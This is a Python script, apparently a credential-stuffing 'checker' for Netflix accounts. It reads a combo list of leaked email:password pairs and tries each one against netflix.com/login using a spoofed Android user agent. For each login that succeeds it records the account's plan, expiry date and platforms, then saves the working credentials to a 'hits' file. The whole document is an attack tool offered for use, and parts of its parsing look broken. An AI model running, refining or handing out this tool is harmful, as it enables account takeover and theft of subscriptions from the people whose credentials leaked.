import requests
import time
import datetime
import os
print('----------@arn4v_15----------')
print('Hits Will Be Automatically Saved In The Folder Where You Have Saved This Checker')
input('Press Enter To Add Combo\WordList: ')
cp = input('Enter The Path Of Your Combo\WordList: ')
eprf = open(cp,'r')
eprl = eprf.readlines()
for i in eprl:
    user,pasn = i.split(':')
    pas = pasn[0:-1]
    login_url = 'https://www.netflix.com/login'
    login_payload = '{"email":"'+user+'","password":"'+pas+'","returnSecureToken":true}'
    login_headers = {
        'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'content-length': '59',
    'content-type': 'application/json',
    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-S901N Build/PQ3A.190605.003)'
    }
    login = requests.post(login_url, data = login_payload, headers = login_headers)
    login_success = 'idToken'
    login_source = login.text
    if login_success in login_source:
        tk_find_s = login_source.find('idToken": "')
        tk_find_e = login_source.find('"', tk_find_s+50)
        tk = login_source[tk_find_s+11:tk_find_e]
        subscription_url_get = 'https://www.netflix.com/login'
        subscription_headers_get = {
        'authorization': 'Bearer '+tk,
        'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 9; SM-S901N Build/PQ3A.190605.003)'
    }
        subscription = requests.get(subscription_url_get, headers = subscription_headers_get)
        subscription_source = subscription.text
        if subscription_source == 'null':
            print(f'{user}:{pas} --> Free Account')
            continue
        # print(subscription_source)
        find_pns = subscription_source.find('name":"')+7
        find_pne = subscription_source.find('"',find_pns)
        plan_name = subscription_source[find_pns:find_pne]
        find_pes = subscription_source.find('T',15)
        expiry_date = subscription_source[20:find_pes]
        ex_ut = time.mktime(datetime.datetime.strptime(expiry_date, '%Y-%m-%d').timetuple())
        cur_ut = time.time()
        dl = str(int((ex_ut-cur_ut)/84600))
        find_sps = subscription_source.find('platforms":[')+12
        find_spe = subscription_source.find(']',find_sps)
        sp = subscription_source[find_sps:find_spe].replace('"',' ')
        print('User => '+user)
        print('Password => '+pas)
        print('Plan Name => '+plan_name)
        print('Expiry Date => '+expiry_date)
        print('Days Left => '+dl)
        print('Supported Platforms => '+sp)
        print('Checker By => @arn4v_15')
        save_hits = open('Netflix.txt', 'a')
        save_hits.write(f'\n----------Hardyisop----------\nUser => {user}\nPassword => {pas}\nPlan => {plan_name}\nExpiry => {expiry_date}\nDays Left => {dl}\nSupported Platforms => {sp}\nChecker By => @hardyisop\n----------Hardyisop----------\n')
    else:
        print(f'{user}:{pas}+ --> Failed')